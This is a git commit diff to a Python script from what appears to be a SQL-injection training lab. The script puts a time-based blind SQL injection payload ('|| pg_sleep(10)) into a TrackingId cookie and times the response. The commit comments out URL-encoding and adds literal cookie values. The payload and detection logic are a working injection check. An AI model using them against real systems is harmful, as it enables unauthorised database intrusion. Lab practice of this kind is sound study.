5c6b0aa4e3655cb988d71bf2c3d8a11be4399a27
Jozenartes <jozenarts12@gmail.com>
2025-06-17 15:01:57 +0100

    Commented out a line of code

--- 05-SQL-Injection/Lab-02/Blind-SQLI.py
+++ 05-SQL-Injection/Lab-02/Blind-SQLI.py
@@ -10,8 +10,8 @@ proxies = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def blind_sqli_check(url):
     sqli_payload = "'|| pg_sleep(10)-- -"
-    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
-    cookies = {'TrackingId':'' + sqli_payload,'session':''}
+    #sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+    cookies = {'TrackingId':'eR2ONaIqvtbLEDQ8' + sqli_payload,'session':'kaLEwKrSu0j9LUjSG5QZnCibOCmn7tcC'}
     r = requests.get(url,cookies=cookies,verify=False,proxies=proxies)
     if int(r.elapsed.total_seconds()) > 10:
         print("[+] Vulnerable to blind-based SQL injection")
